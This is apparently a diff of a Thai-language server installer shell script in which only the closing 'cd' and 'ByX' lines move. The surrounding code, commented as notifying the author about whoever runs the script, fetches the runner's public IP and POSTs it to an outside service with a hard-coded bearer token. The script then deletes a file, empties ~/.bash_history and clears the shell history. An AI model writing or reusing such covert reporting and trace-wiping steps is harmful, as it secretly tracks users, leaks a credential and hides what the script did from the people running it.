@@ -127,8 +127,7 @@ echo -e "      \033[1;33mกำลังติดตั้งฟังก์ช�
 echo ""
 fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
 clear
-cd
-ByX
+
 #แจ้งเตือนคนรันสคิป
 IP=$(wget -qO- ipv4.icanhazip.com);
 curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
@@ -140,3 +139,5 @@ echo ""
 echo -e "\033[1;31m \033[1;33mเปิดเมนูคำสั่ง: \033[1;32mmenu\033[0m"
 echo -e "\033[1;33mมีปัญหาอื่นๆติดต่อadmin \033[1;31m(\033[1;36mLine\033[1;31m): \033[1;37m@gzn007\033[0m"
 rm $HOME/HXC && cat /dev/null > ~/.bash_history && history -c
+cd
+ByX
